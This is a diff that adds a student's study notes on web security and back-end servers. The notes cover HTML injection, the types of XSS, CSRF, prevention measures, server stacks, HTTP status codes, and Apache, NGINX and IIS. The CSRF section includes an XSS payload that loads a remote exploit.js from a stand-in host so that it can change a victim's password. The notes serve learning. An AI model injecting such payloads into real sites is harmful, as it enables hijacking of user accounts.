@@ -212,3 +212,99 @@ Some of the most common front end JavaScript frameworks are:
 
 ## Sensitive Data Exposure
 
+### It is important to sanitize user input on the backend and frontend.
+
+### HTML injection occurs when unfiltered user input is displayed on the page.
+"When a user has complete control of how their input will be displayed, they can submit HTML code, and the browser may display it as part of the page."
+
+# XSS Cross-site Scripting
+- HTML Injection vulnerabilities can often be used to also perform XSS attacks.
+- XSS attacks usually utilize javascript as an injection language to perform more advanced attacks.
+
+## Types of XSS
+- Reflected XSS = When user input is displayed on the page.
+- Stored XSS = When user input is stored in the back end database and then displayed upon retreival.
+- DOM XSS = When user input is directly shown in the browser and is written in an HTML DOM object.
+-- With DOM, think the ability to display users cookie by accessing HTML doc tree and retrieving the cookie object's value.
+
+# Cross-Site Request Forgery (CSRF)
+
+## CSRF attacks may utilize XSS vulnerabilities to perform certain queries, and API calls on a web application that the victim is currently authenticated to. 
+- Think Cross-Site like XSS and then Request Forgery (requesting things while pretending to be someone else.
+
+Could be used to change a victims password or atacking admins.
+
+## For example, we could load our own .js file using:
+"><script src=//www.example.com/exploit.js></script>
+
+### Crafting this .js file requires we know a few things, such as knowledge of the web apps password changing procedures and APIs.
+
+# Prevention Front-End
+
+- Sanitization = Removing special characters and non standard characters from user input before displaying it or storing it.
+- Validation = Ensuring that submitted user input matches the expected format(such as email).
+
+## Another prevention technique would be to implement a WAF. Prevents injection attempts automatically.
+## "Furthermore, many modern web applications have anti-CSRF measures, including certain HTTP headers and flags that can prevent automated requests (i.e., anti-CSRF token, or http-only/X-XSS-Protection)."
+
+# Back End Servers
+
+## The hardware and operating systems
+- Web Server
+- Database
+- Development Framework
+--- Other Components
+- Hypervisors
+- Containers
+- WAFs
+
+# There are many popular combinations of "stacks" for back-end servers, which contain a specific set of back end components.
+
+Conbinations(Stacks):
+LAMP = Linux, Apache, MySQL, and PHP
+WAMP = Windows, Apache, MySQL, and PHP
+WINS = Windows, IIS, .NET, and SQL Server
+MAMP = macOS, Apache, MySQL, and PHP
+XAMPP = Cross-Platform, Apache, MySQL, and PHP/Perl
+https://en.wikipedia.org/wiki/Solution_stack - Comprehensive List
+
+# Web Servers
+- Application that runs on the back end.
+- handles all of the HTTP traffic from the client-side browser, routes it to the requested pages, and finally responds to the client-side browser.
+- Usually run on ports 80 and 443.
+
+# Workflows
+## Many HTTP response codes;
+200 Ok
+301 Voved Forever
+302 Found - address changed temp
+400 Bad Request
+401 Unauthroized
+403 Forbidden
+404 Not Found
+405 Method Not Allowed
+408 Request Timeout
+500 Internal Server Error
+504 Gateway TImeout
+ 
+## Web servers also accept various types of user input within HTTP requests, including text, JSON, and even binary data (i.e., for file uploads).
+
+# Apache
+Apache 'or httpd' is the most common web server on the internet, hosting more than 40% of all internet websites. Apache usually comes pre-installed in most Linux distributions and can also be installed on Windows and macOS servers.
+Apache is commonly used by startups and smaller companies, as it is straightforward to develop for. Still, some big companies utilize Apache
+Apple 	Adobe 	Baidu
+
+# NGINX
+
+The second most common web server on the internet, hosting roughly 30% of all internet websites. NGINX focuses on serving many concurrent web requests with relatively low memory and CPU load by utilizing an async architecture to do so. 
+60% of the top 100,000 websites are using NGINX.
+Google 	Facebook 	Twitter 	Cisco 	Intel 	Netflix 	HackTheBox
+
+# IIS
+
+IIS (Internet Information Services) is the third most common web server on the internet, hosting around 15% of all internet web sites. IIS is developed and maintained by Microsoft and mainly runs on Microsoft Windows Servers. IIS is usually used to host web applications developed for the Microsoft .NET framework, but can also be used to host web applications developed in other languages like PHP, or host other types of services like FTP.
+Furthermore, IIS is very well optimized for Active Directory integration and includes features like Windows Auth for authenticating users using Active Directory, allowing them to automatically sign in to web applications.
+Microsoft 	Office365 	Skype 	Stack Overflow 	Dell
+
+### Aside from these 3 web servers, there are many other commonly used web servers, like Apache Tomcat for Java web applications, and Node.JS for web applications developed using JavaScript on the back end.
+
